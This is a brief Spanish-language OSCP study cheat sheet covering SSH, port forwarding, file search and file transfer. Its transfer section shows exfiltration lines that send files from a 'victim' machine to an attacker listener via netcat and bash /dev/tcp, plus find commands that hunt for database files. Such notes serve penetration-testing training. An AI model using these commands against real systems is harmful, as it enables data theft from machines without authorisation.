# Apuntes-OSCP

## SSH
```bash
 ssh -p22 usuario@host_remoto
```
#### reenvio de puertos
```bash
 ssh -L [PUERTO_LOCAL]:[HOST_REMOTO]:[PUERTO_REMOTO] usuario@host_remoto
```
#### Inicio de sesion con id_rsa
El id_rsa debe tener el siguiente permiso
```bash
 chmod 600 id_rsa
```
```bash
 ssh -i id_rsa usuario@host_remoto
```
## Transferencia de archivos
* `SCP`
* `find / -name 'sbd*'`
Traer el archivo a mi maquina con scp
```bash
 scp target_user@IP_remota:/ruta/completa/al/archivo .
```
* `NC` 
Es util cuando no dispongo de la contraseña
</br>en la maquina victima
```bash
nc 19.10.10.10 9091 < archivo
```
luego en mi maquina
```bash
nc -lvnp 9091 > archivo
```
Otra Alternativa es
```bash
cat file.txt > /dev/tcp/192.168.1.23/4444 # on victim linux
```
```bash
nc -lvp 4444 > file.txt # on Kali
```
* `BASE64` 
Cuando el archivo no es texto plano, ej: una BD entonces
Tenemos (2) formas
1.
```bash
base64 filename.db > outputfile.db.b64
```
2. 
```bash
echo -n 'texto' | base64
```
Luego en mi maquina
```bash
base64 -d encodedfile.db.b64 > outputfile.db
```
## Busqueda de archivos

* `find / -name 'sbd*'`
* `find / -name 'foldername' -type d`
* `find / -name 'filename' -type f`
* `find / -name 'sbd*' -exec file {} \;`
</br> Buscar por extension </br>
* `find / -type f -iname "*.db" 2>/dev/null`
</br> Buscar varios archivos
* `find / -type f \( -iname "*.db" -o -iname "*.sqlite" -o -iname "*.sqlite3" \) 2>/dev/null`

